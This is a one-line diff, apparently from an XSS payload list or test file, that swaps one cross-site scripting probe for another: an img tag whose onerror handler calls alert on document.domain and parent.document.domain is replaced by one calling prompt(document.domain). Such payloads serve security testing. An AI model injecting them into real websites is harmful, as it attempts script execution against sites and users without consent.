@@ -1,1 +1,1 @@
-<img src=x onerror=alert(document.domain);alert(parent.document.domain)>
+<img src=x onerror=prompt(document.domain)>
